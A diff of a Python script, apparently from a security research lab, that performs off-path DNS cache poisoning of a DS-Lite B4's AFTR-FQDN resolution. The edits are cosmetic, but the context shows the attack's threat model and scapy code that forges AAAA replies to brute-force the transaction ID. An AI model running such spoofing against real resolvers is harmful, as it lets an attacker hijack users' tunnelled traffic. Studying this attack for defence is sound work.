@@ -1,10 +1,10 @@
 #!/usr/bin/python3
-# dns_offpath_poison.py - off-path DNS cache poisoning of the B4's AFTR-FQDN
-# resolution (the evolved T11, "Softwire DNS-Discovery Hijack").
+# dns_offpath_poison.py — off-path DNS cache poisoning of the B4's AFTR-FQDN
+# resolution (the evolved T8, "Softwire DNS-Discovery Hijack").
 #
 # Threat model (Man et al. SADDNS + classic Kaminsky): an OFF-PATH attacker that
 # cannot see the resolver's query. It is ASSUMED to know the resolver's upstream
-# source port (derandomised via the SADDNS ICMP side channel - shown feasible:
+# source port (derandomised via the SADDNS ICMP side channel — shown feasible:
 # 300 probes -> 6 ICMP, the global rate limit leaks open/closed). It then races
 # the (slow/absent) authoritative answer by flooding forged AAAA replies that
 # brute-force the 16-bit TXID. A single matching reply poisons the resolver's
@@ -66,7 +66,7 @@ def main():
 
     dmac = resolve_mac(a.iface, a.resolver)
     smac = "02:00:00:00:0d:20"
-    # forged AAAA reply (lowercase qname - the attacker cannot know the 0x20 case)
+    # forged AAAA reply (lowercase qname — the attacker cannot know the 0x20 case)
     dns = DNS(id=0, qr=1, aa=1,
               qd=DNSQR(qname=a.domain, qtype="AAAA"),
               an=DNSRR(rrname=a.domain, type="AAAA", rdata=a.poison_ip, ttl=60))
